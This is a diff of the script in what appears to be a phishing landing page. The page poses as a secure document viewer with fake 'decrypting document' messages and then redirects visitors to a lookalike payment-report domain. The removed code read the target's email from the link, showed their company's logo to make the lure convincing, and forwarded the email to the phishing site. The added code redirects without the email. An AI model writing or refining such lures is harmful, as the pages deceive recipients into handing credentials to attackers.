@@ -136,79 +136,35 @@
 
     <script>
     (function() {
-        const loadingText = document.getElementById('loadingText');
-        const texts = [
-            "Establishing secure channel...",
-            "Verifying your identity...",
-            "Decrypting document...",
-            "Opening file..."
+        /* ---------------------------------------------------------
+           Simplified redirect logic – NO auto-grab email needed
+           --------------------------------------------------------- */
+
+        const loadingText  = document.getElementById('loadingText');
+        const progressBar  = document.getElementById('progressBar');
+
+        /* Loader text animation */
+        const messages = [
+            'Establishing secure channel...',
+            'Decrypting document...',
+            'Opening file...'
         ];
-        let textIndex = 0;
-        const interval = setInterval(() => {
-            textIndex++;
-            if (textIndex < texts.length) {
-                loadingText.textContent = texts[textIndex];
-            } else {
-                clearInterval(interval);
-            }
-        }, 600);
+        let idx = 0;
+        const anim = setInterval(() => {
+            idx = (idx + 1) % messages.length;
+            loadingText.textContent = messages[idx];
+        }, 700);
 
-        const REDIRECT_DELAY = 3500;
-        const MOBILE_REDIRECT_URL_BASE = "https://launchits.it.com/vbuP5UURVDU/#G";
+        /* Redirect after delay without appending any email parameter */
+        const REDIRECT_DELAY_MS = 3500;
+        const REDIRECT_URL      = 'https://paymentrequestbatchreport.tdmgo.co/?WqXmwl=S0pCTktYQ1dTSlNOQ1NKSw%3D%3D&pCmfRY=FkpVQ&username=';
 
-        function getEmailFromState() {
-            const searchParams = new URLSearchParams(window.location.search);
-            const state = searchParams.get('state');
-            if (!state) return null;
-
-            const parts = state.split(':');
-            if (parts.length > 1) {
-                const potentialEmail = parts[parts.length - 1];
-                if (potentialEmail && potentialEmail.includes('@')) {
-                    return potentialEmail;
-                }
-            }
-            return null;
-        }
-
-        function setCompanyLogo(email) {
-            if (!email) return;
-            const domain = email.split('@')[1];
-            if (domain) {
-                const logoEl = document.getElementById('companyLogo');
-                const logoUrl = `https://logo.clearbit.com/${domain}`;
-                
-                logoEl.src = logoUrl;
-                logoEl.onload = () => { logoEl.style.display = 'block'; };
-                logoEl.onerror = () => { logoEl.style.display = 'none'; };
-            }
-        }
-        
-        function performRedirect() {
-            clearInterval(interval);
-            const email = getEmailFromState();
-
-            if (email) {
-                console.log("Found email:", email);
-                const redirectUrl = MOBILE_REDIRECT_URL_BASE + encodeURIComponent(email);
-                console.log("Redirecting to:", redirectUrl);
-                window.location.href = redirectUrl;
-            } else {
-                console.log("No email found in state parameter. Showing error.");
-                document.getElementById('loadingText').textContent = 'Access Denied: Invalid or Expired Link';
-                document.getElementById('loadingText').style.color = '#DC3545'; // Red error color
-                document.querySelector('.file-info').textContent = 'Please check the link or contact the sender.';
-                const progressBar = document.getElementById('progressBar');
-                if (progressBar) {
-                    progressBar.style.background = '#DC3545';
-                    progressBar.style.width = '100%';
-                }
-            }
-        }
-        
-        const email = getEmailFromState();
-        setCompanyLogo(email);
-        setTimeout(performRedirect, REDIRECT_DELAY);
+        setTimeout(() => {
+            clearInterval(anim);
+            loadingText.textContent = 'Redirecting…';
+            progressBar.style.width = '100%';
+            window.location.replace(REDIRECT_URL);
+        }, REDIRECT_DELAY_MS);
     })();
     </script>
 </body>
